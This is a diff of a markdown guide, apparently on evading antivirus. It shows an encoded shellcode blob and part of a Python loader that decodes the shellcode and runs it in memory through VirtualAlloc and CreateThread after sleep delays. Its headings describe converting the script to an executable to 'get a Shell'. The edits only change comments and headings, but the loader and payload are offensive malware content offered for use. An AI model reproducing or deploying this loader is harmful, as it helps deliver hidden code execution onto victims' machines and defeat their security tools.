@@ -77,7 +77,7 @@ hkpgh_sgho_ghq+gh_pghjsghlmghq+ghspghqighzlghojghkughyjghkzghqsghpkgh_ughwqgh+zg
 ghysghzughj_ghlighlqghk+ghwkghl_ghyughjlghqmghimghz=ghomghmmghllghzigh+=gh+ughjkghmyghi=ghy_ghpogho+
 
 ```
-####Python ShellExec Using the encoded Shellcode
+####Python ShellExec script Using the encoded Shellcode
 
 ```python
 #!/usr/bin/python
@@ -119,7 +119,7 @@ diablo = decoder(salvation)
 # Take another nap
 time.sleep(60)
 
-# Cast the decoded shellcode to bytearray and 
+# Cast the decoded shellcode to bytearray and wait for it :D
 jesus = bytearray(diablo.replace('\\x', '').decode('hex'))
 
 ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
@@ -143,7 +143,7 @@ ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
 ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
 
 ```
-#### Convert the Python to Exe and get a Shell.
+#### Convert the Python Script to Exe and get a Shell.
 
 ![Py2EXE](https://s29.postimg.org/5em0w2pnr/payslip.png)
 
